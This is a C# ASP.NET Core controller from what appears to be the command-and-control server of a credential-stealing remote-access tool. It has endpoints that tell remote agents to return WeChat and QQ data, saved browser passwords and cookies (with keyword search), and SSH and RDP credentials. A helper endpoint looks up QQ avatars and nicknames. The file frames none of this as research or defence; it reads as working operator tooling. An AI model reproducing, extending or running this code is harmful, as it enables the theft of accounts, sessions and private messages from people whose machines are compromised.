using System.Text.Json;
using System.Text.RegularExpressions;
using Microsoft.AspNetCore.Authorization;
using Microsoft.AspNetCore.Mvc;
using LibraNextgen.Common.Protocol;
using LibraNextgen.Service.Services;

namespace LibraNextgen.Service.Controllers;

[ApiController]
[Route("api/othersoft")]
[Authorize]
public class OtherSoftController : ControllerBase
{
    private readonly RelayService _relay;
    private static readonly HttpClient _http = new() { Timeout = TimeSpan.FromSeconds(8) };

    public OtherSoftController(RelayService relay)
    {
        _relay = relay;
    }

    private async Task<IActionResult> RelayAndWaitAsync(string agentId, string messageType, object? data, CancellationToken ct, int timeoutSeconds = 30)
    {
        var response = await _relay.RelayAndWaitAsync(agentId, messageType, data, ct, TimeSpan.FromSeconds(timeoutSeconds));
        if (response == null)
            return StatusCode(504, new { error = "Agent did not respond in time." });
        return response.Data != null
            ? Content(response.Data.Value.GetRawText(), "application/json")
            : Ok(new { status = "ok" });
    }

    [HttpPost("{agentId}/wechat")]
    public async Task<IActionResult> GetWeChat(string agentId, CancellationToken ct)
    {
        return await RelayAndWaitAsync(agentId, "othersoft.wechat", null, ct);
    }

    [HttpPost("{agentId}/qq")]
    public async Task<IActionResult> GetQQ(string agentId, CancellationToken ct)
    {
        return await RelayAndWaitAsync(agentId, "othersoft.qq", null, ct);
    }

    [HttpPost("{agentId}/browser")]
    public async Task<IActionResult> GetBrowser(string agentId, [FromBody] JsonElement body, CancellationToken ct)
    {
        var type = body.TryGetProperty("type", out var t) ? t.GetString() ?? "passwords" : "passwords";
        var offset = body.TryGetProperty("offset", out var o) ? o.GetInt32() : 0;
        var limit = body.TryGetProperty("limit", out var l) ? l.GetInt32() : 250;
        var timeout = type == "cookies" ? 60 : 30;
        return await RelayAndWaitAsync(agentId, "othersoft.browser", new { type, offset, limit }, ct, timeout);
    }

    [HttpPost("{agentId}/browser/search")]
    public async Task<IActionResult> SearchBrowser(string agentId, [FromBody] JsonElement body, CancellationToken ct)
    {
        var type = body.TryGetProperty("type", out var t) ? t.GetString() ?? "all" : "all";
        var keyword = body.TryGetProperty("keyword", out var k) ? k.GetString() ?? "" : "";
        if (string.IsNullOrWhiteSpace(keyword))
            return BadRequest(new { error = "keyword is required" });
        return await RelayAndWaitAsync(agentId, "othersoft.browser.search", new { type, keyword }, ct, 60);
    }

    [HttpPost("{agentId}/ssh")]
    public async Task<IActionResult> GetSSH(string agentId, CancellationToken ct)
    {
        return await RelayAndWaitAsync(agentId, "othersoft.ssh", null, ct, 20);
    }

    [HttpPost("{agentId}/rdp")]
    public async Task<IActionResult> GetRDP(string agentId, CancellationToken ct)
    {
        return await RelayAndWaitAsync(agentId, "othersoft.rdp", null, ct, 30);
    }

    /// <summary>Fetch QQ portraits from qzone (server-side, no CORS).</summary>
    [HttpPost("qqportrait")]
    public async Task<IActionResult> GetQQPortrait([FromBody] JsonElement body, CancellationToken ct)
    {
        var qqList = new List<string>();
        if (body.TryGetProperty("qq", out var qqEl))
        {
            foreach (var item in qqEl.EnumerateArray())
                qqList.Add(item.GetString() ?? "");
        }

        if (qqList.Count == 0)
            return Ok(new { });

        try
        {
            var qqStr = string.Join(",", qqList);
            var url = $"https://users.qzone.qq.com/fcg-bin/cgi_get_portrait.fcg?uins={Uri.EscapeDataString(qqStr)}";
            var resp = await _http.GetStringAsync(url, ct);

            var m = Regex.Match(resp, @"portraitCallBack\(\s*(\{.*\})\s*\)", RegexOptions.Singleline);
            if (!m.Success)
                return Ok(new { });

            var json = m.Groups[1].Value;
            using var doc = JsonDocument.Parse(json);

            var result = new Dictionary<string, object?>();
            foreach (var prop in doc.RootElement.EnumerateObject())
            {
                if (prop.Value.ValueKind == JsonValueKind.Array && prop.Value.GetArrayLength() >= 7)
                {
                    var arr = prop.Value;
                    result[prop.Name] = new
                    {
                        avatar = arr[0].GetString() ?? "",
                        nickname = arr[6].GetString() ?? prop.Name
                    };
                }
            }

            return Ok(result);
        }
        catch
        {
            return Ok(new { });
        }
    }

}
